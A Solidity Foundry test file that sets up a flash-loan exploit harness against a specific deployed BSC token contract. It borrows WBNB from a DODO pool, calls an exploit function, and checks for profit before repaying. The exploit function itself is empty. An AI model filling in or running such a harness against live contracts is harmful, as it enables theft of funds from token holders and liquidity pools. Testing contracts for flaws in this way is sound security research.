// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IShibZilla {
    function isFeeExempt(address) external returns (bool);
    function isTxLimitExempt(address) external returns (bool);
    function isTimelockExempt(address) external returns (bool);
    function isDividendExempt(address) external returns (bool);
    function liquidityFee() external returns (uint256);
    function reflectionFee() external returns (uint256);
    function marketingFee() external returns (uint256);
    function BuyBack() external returns (uint256);
    function totalFee() external returns (uint256);
    function feeDenominator() external returns (uint256);
    function maxRoomRent() external returns (uint256);
    function BotkillerMode() external returns (bool);
    function isHouseguest(address) external returns (bool);
    function deadBlocks() external returns (uint256);
    function launchedAt() external returns (uint256);
    function sellMultiplier() external returns (uint256);
    function autoLiquidityReceiver() external returns (address);
    function marketingFeeReceiver() external returns (address);
    function BuyBackReceiver() external returns (address);
    function router() external returns (address);
    function pair() external returns (address);
    function pairContract() external returns (address);
    function tradingOpen() external returns (bool);
    function distributor() external returns (address);
    function buyCooldownEnabled() external returns (bool);
    function cooldownTimerInterval() external returns (uint8);
    function swapEnabled() external returns (bool);
    function master() external returns (address);
    function swapThreshold() external returns (uint256);
    function rebase_count() external returns (uint256);
    function rate() external returns (uint256);
    function _totalSupply() external returns (uint256);
    function _maxTxAmount() external returns (uint256);
    function _maxWalletToken() external returns (uint256);
    function authorize(address) external;
    function unauthorize(address) external;
    function isOwner(address) external view returns (bool);
    function isAuthorized(address) external view returns (bool);
    function transferOwnership(address) external;
    function rebase_percentage(uint256,bool) external returns (uint256);
    function rebase(uint256,int256) external returns (uint256);
    function totalSupply() external view returns (uint256);
    function decimals() external pure returns (uint8);
    function symbol() external pure returns (string memory);
    function name() external pure returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function approveMax(address) external returns (bool);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function clearStuckBalance(uint256) external;
    function clearStuckBalance_sender(uint256) external;
    function set_sell_multiplier(uint256) external;
    function tradingStatus(bool,uint256) external;
    function launchStatus(uint256) external;
    function enable_hotel_CaliforniaMode(bool) external;
    function set_max_roomrent(uint256) external;
    function manage_houseguests(address[] calldata,bool) external;
    function cooldownEnabled(bool,uint8) external;
    function setIsDividendExempt(address,bool) external;
    function setIsFeeExempt(address,bool) external;
    function setIsTxLimitExempt(address,bool) external;
    function setIsTimelockExempt(address,bool) external;
    function setFees(uint256,uint256,uint256,uint256,uint256) external;
    function setFeeReceivers(address,address,address) external;
    function setSwapBackSettings(bool,uint256) external;
    function setTargetLiquidity(uint256,uint256) external;
    function manualSync() external;
    function setLP(address) external;
    function setMaster(address) external;
    function isNotInSwap() external view returns (bool);
    function checkSwapThreshold() external view returns (uint256);
    function setDistributionCriteria(uint256,uint256) external;
    function setDistributorSettings(uint256) external;
    function rescueToken(address,uint256) external returns (bool);
    function getCirculatingSupply() external view returns (uint256);
    function getLiquidityBacking(uint256) external view returns (uint256);
    function isOverLiquified(uint256,uint256) external view returns (bool);
    function checkMaxWalletToken() external view returns (uint256);
    function checkMaxTxAmount() external view returns (uint256);
    function setMaxWalletPercent_base1000(uint256) external;
    function setMaxTxPercent_base1000(uint256) external;
    function multiTransfer(address,address[] calldata,uint256[] calldata) external;
    function multiTransfer_fixed(address,address[] calldata,uint256) external;
    function rebase_updatebalance(address[] calldata) external;
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {}
}


